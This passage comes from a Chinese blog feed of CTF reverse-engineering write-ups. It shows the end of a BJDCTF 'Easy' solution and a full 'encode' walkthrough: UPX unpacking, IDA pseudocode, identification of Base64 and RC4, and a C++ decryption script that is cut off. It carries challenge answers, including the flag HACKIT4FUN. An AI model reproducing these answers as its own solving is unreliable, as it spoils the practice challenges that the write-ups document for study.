<code>__ques</code> 函数的结束地址：<code>0x00401723</code>（在 retn 返回之前）</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/BJDCTF-Easy9.png" alt="BJDCTF-Easy9.png"></p><p>在 OllyDBG 中该地址处 F2 下断点，便于查看 <code>__ques</code> 函数的输出信息：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/BJDCTF-Easy10.png" alt="BJDCTF-Easy10.png"></p><p>F9 运行程序：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/BJDCTF-Easy11.png" alt="BJDCTF-Easy11.png"></p><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>HACKIT4FUN</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/BJDCTF-Easy12.png" alt="BJDCTF-Easy12.png"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【BJDCTF】encode</title>
      <link href="/posts/65c779bb.html"/>
      <url>/posts/65c779bb.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><mark>要求能看出伪代码中的加密算法，本题中的 Base64 和 RC4</mark></li></ul><hr><p><a href="https://www.ctfer.vip/problem/701">【BJDCTF】encode</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>先进行常规 upx 脱壳 （脱壳机好像有问题，用 cmd 脱壳，<code>upx -d &lt;文件名&gt;</code>）</p><p>没有 main 函数，<code>shift + F12</code> 查看字符串，发现与 flag 有关的信息</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/BJDCTF-encode1.png" alt="BJDCTF-encode1.png"></p><p>在 IDA View-A 中跟进</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/BJDCTF-encode2.png" alt="BJDCTF-encode2.png"></p><p>进入函数 <code>sub_804887C()</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/BJDCTF-encode3.png" alt="BJDCTF-encode3.png"></p><p><mark>根据经验，将一些函数进行 rename</mark>，得到代码如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">sub_804887C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v0<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [esp+Ch] [ebp-FCh]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// [esp+10h] [ebp-F8h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// [esp+14h] [ebp-F4h]</span>  <span class="token keyword">char</span> v5<span class="token punctuation">[</span><span class="token number">48</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+1Ah] [ebp-EEh] BYREF</span>  <span class="token keyword">char</span> v6<span class="token punctuation">[</span><span class="token number">178</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+4Ah] [ebp-BEh] BYREF</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// [esp+FCh] [ebp-Ch]</span>  v7 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">strcpy</span><span class="token punctuation">(</span>v5<span class="token punctuation">,</span> <span class="token string">"Flag&#123;This_a_Flag&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">strcpy</span><span class="token punctuation">(</span>v6<span class="token punctuation">,</span> <span class="token string">"E8D8BD91871A1E56F53F4889682F96142AF2AB8FED7ACFD5E"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please input your flag:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v6<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v6<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">21</span> <span class="token punctuation">)</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v0 <span class="token operator">=</span> <span class="token function">sub_8048AC2</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v6<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">strcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v5<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v0<span class="token punctuation">)</span><span class="token punctuation">;</span>  v4 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v5<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> v4<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    v5<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">^=</span> v5<span class="token punctuation">[</span>i <span class="token operator">%</span> v3<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token function">sub_8048E24</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v5<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v4<span class="token punctuation">,</span> v5<span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v5<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v6<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"right!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">!=</span> v7 <span class="token punctuation">)</span>    <span class="token function">sub_806FA00</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那么就只存在两处函数不明确作用，一个是 <code>sub_8048AC2</code>，一个是 <code>sub_8048E24</code></p><p>查看函数 <code>sub_8048AC2</code> ：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/BJDCTF-encode4.png" alt="BJDCTF-encode4.png"></p><p>查看 <code>a0123456789Abcd</code> 中的内容：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/BJDCTF-encode5.png" alt="BJDCTF-encode5.png"></p><p>发现 <code>a0123456789Abcd</code> 是 Base64 加密的码表，根据 <code>sub_8048AC2</code> 函数的结构，可以判断这可能是 Base64 加密的算法</p><p>查看函数 <code>sub_8048E24</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/BJDCTF-encode6.png" alt="BJDCTF-encode6.png"></p><p>根据函数调用，查看函数 <code>sub_8048CC2</code> ：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/BJDCTF-encode7.png" alt="BJDCTF-encode7.png"></p><p>基本可以断定，<code>sub_8048CC2</code> 函数是一个 RC4 算法的加密初始化，那么 <code>sub_8048E24</code> 就是 RC4 加密的算法</p><p>得到最终的程序逻辑：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">sub_804887C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v0<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [esp+Ch] [ebp-FCh]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// [esp+10h] [ebp-F8h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// [esp+14h] [ebp-F4h]</span>  <span class="token keyword">char</span> v5<span class="token punctuation">[</span><span class="token number">48</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+1Ah] [ebp-EEh] BYREF</span>  <span class="token keyword">char</span> v6<span class="token punctuation">[</span><span class="token number">178</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+4Ah] [ebp-BEh] BYREF</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// [esp+FCh] [ebp-Ch]</span>  v7 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">strcpy</span><span class="token punctuation">(</span>v5<span class="token punctuation">,</span> <span class="token string">"Flag&#123;This_a_Flag&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">strcpy</span><span class="token punctuation">(</span>v6<span class="token punctuation">,</span> <span class="token string">"E8D8BD91871A1E56F53F4889682F96142AF2AB8FED7ACFD5E"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please input your flag:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v6<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v6<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">21</span> <span class="token punctuation">)</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v0 <span class="token operator">=</span> <span class="token function">Base64</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v6<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v5<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v0<span class="token punctuation">)</span><span class="token punctuation">;</span>  v4 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v5<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> v4<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    v5<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">^=</span> v5<span class="token punctuation">[</span>i <span class="token operator">%</span> v3<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token function">RC4</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v5<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v4<span class="token punctuation">,</span> v5<span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v5<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v6<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"right!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">!=</span> v7 <span class="token punctuation">)</span>    <span class="token function">sub_806FA00</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>经过分析，逻辑就是 <code>rc4(xor(base64(input)))</code>，key是 <code>Flag&#123;This_a_Flag&#125;</code>，但最终 cipher 是有点问题的，需要手动 Base16 解密成字节码才能用</p><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><h2 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h2><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">typedef</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> ULONG<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">rc4_init</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>key<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> Len<span class="token punctuation">)</span>    <span class="token comment">//初始化函数</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> i <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> k<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> tmp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>        k<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> key<span class="token punctuation">[</span>i <span class="token operator">%</span> Len<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        j<span class="token operator">=</span><span class="token punctuation">(</span>j <span class="token operator">+</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> k<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>        tmp <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//交换s[i]和s[j]</span>        s<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">rc4_crypt</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>Data<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> Len<span class="token punctuation">)</span>    <span class="token comment">//加解密</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> t <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> tmp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>k <span class="token operator">&lt;</span> Len<span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        i<span class="token operator">=</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>        j<span class="token operator">=</span><span class="token punctuation">(</span>j <span class="token operator">+</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>        tmp <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//交换s[x]和s[y]</span>        s<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span>        t<span class="token operator">=</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>        Data<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">^=</span> s<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">FindIndex</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>string<span class="token punctuation">,</span><span class="token keyword">char</span> c<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> i<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>c <span class="token operator">==</span> string<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">return</span> i<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>input<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> output<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>string <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"0123456789+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> input_length <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> input_length<span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span> <span class="token operator">>=</span> input_length<span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>output<span class="token punctuation">[</span>index<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">FindIndex</span><span class="token punctuation">(</span>string<span class="token punctuation">,</span>input<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token function">FindIndex</span><span class="token punctuation">(</span>string<span class="token punctuation">,</span>input<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">2</span> <span class="token operator">>=</span> input_length<span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>output<span class="token punctuation">[</span>index<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">FindIndex</span><span class="token punctuation">(</span>string<span class="token punctuation">,</span>input<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token function">FindIndex</span><span class="token punctuation">(</span>string<span class="token punctuation">,</span>input<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">3</span> <span class="token operator">>=</span> input_length<span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>output<span class="token punctuation">[</span>index<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">FindIndex</span><span class="token punctuation">(</span>string<span class="token punctuation">,</span>input<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token function">FindIndex</span><span class="token punctuation">(</span>string<span class="token punctuation">,</span>input<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"result:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>output<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"HEX："</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>output<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%x "</span><span class="token punctuation">,</span>output<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>     <span class="token keyword">unsigned</span> <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">257</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token comment">//S-box</span>    <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> key<span class="token punctuation">[</span><span class="token number">257</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Flag&#123;This_a_Flag&#125;\x00"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>     <span class="token comment">//key</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> pData<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0xe8</span><span class="token punctuation">,</span><span class="token number">0xd8</span><span class="token punctuation">,</span><span class="token number">0xbd</span><span class="token punctuation">,</span><span class="token number">0x91</span><span class="token punctuation">,</span><span class="token number">0x87</span><span class="token punctuation">,</span><span class="token number">0x1a</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0x0e</span><span class="token punctuation">,</span><span class="token 